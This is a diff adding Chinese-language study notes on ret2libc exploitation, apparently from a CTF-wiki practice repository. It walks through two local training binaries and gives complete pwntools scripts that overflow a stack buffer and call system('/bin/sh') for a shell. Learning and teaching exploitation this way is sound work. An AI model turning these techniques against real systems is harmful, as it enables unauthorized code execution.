@@ -388,3 +388,131 @@ p.sendlineafter("What do you plan to do?\n", payload)
 p.interactive()
 ```
 
+### ret2libc
+
+例1
+
+```bash
+[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2libc1'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用IDA可以发现程序中存在 `system` 函数和 `/bin/sh` 字符串
+
+```
+➜  pwn-study ROPgadget --binary ret2libc1 --string '/bin/sh'
+Strings information
+============================================================
+0x08048720 : /bin/sh
+```
+
+```c
+.plt:08048460 ; int system(const char *command)
+```
+
+通过计算得到要覆盖的区域大小为 `0x70` ，然后压入 `system` 的地址，然后压入一个返回值，最后压入 `/bin/sh` 的地址。
+
+这样子我们可以构造出相应的payload:
+
+```
+payload = 'a'*0x70+sys_addr+'a'*4+binsh_addr
+```
+
+参考代码如下：
+
+```python
+from pwn import *
+
+p = process('./ret2libc1')
+
+sys_addr = 0x08048460
+binsh_addr = 0x08048720
+
+payload = flat(['a'*0x70,sys_addr,'a'*4,binsh_addr])
+p.sendline(payload)
+p.interactive()
+```
+
+例2
+
+```bash
+[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2libc2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+能查到存在 `system` 函数
+
+```c
+.plt:08048490 ; int system(const char *command)
+```
+
+然而由于不存在 `/bin/sh` ，我们需要自己构造这样一个字符串。这样的话，我们需要两个 gadgets。
+
+```c
+.plt:08048460 ; char *gets(char *s)
+```
+
+另外，查看wp之后发现 bss 段中还有一个 `buf2` 字符串，我们可以将输入的 `/bin/sh` 存放到这里。
+
+buf2 的地址：
+
+```
+.bss:0804A080 ; char buf2[100]
+```
+
+我们需要自行构造栈帧，第一次跳到gets函数的位置，第二次跳到system的位置。中间需要平衡栈帧，因此我们用 ` ROPgadgets` 选一个 `pop ebx` 。
+
+执行：
+
+```bash
+ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx'
+```
+
+返回：
+
+```
+0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804843d : pop ebx ; ret
+```
+
+我们选择第二个作为调栈的参数（一会可以试试`pop esi`）。在这些之前，不要忘了看一下要填充的空间大小。我计算得到的是0x70。IDA还是不如实际调试的准啊XD
+
+这样就可以构造出payload了
+
+```
+payload='a'*0x70+gets_addr+pop_ebx+buf2+system_addr+0xdeadbeef+buf2
+```
+
+此时system还缺少参数，如果传入此payload的话可以执行代码，但是只能执行一次。在这之后我们还要再次传入`/bin/sh` 。
+
+完整payload：
+
+```python
+from pwn import *
+
+p = process('./ret2libc2')
+
+gets_addr = 0x08048460
+system_addr = 0x08048490
+popebx_addr = 0x0804843d
+buf2_addr = 0x0804A080
+
+payload = flat([
+    'a' * 0x70, gets_addr, popebx_addr, buf2_addr, system_addr, 0xdeadbeef,
+    buf2_addr
+])
+
+p.sendline(payload)
+p.sendline('/bin/sh')
+p.interactive()
+```
+
+虽然ctf-wiki上说难度和第一个一样，但是我感觉又学到了很多东西呢。。
